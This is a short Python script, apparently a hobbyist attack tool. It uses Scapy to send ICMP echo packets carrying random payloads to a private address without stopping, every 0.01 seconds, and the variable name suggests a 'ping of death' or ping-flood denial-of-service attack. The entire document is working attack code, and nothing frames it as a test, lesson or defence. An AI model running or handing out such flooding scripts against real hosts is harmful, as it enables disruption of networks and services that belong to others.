from scapy.all import *
import os

target="192.168.25.10"
askPingDead=IP(dst=target)/ICMP(type=8)
payload = os.urandom(99)
send(askPingDead/raw(payload),loop=1,inter=0.01)
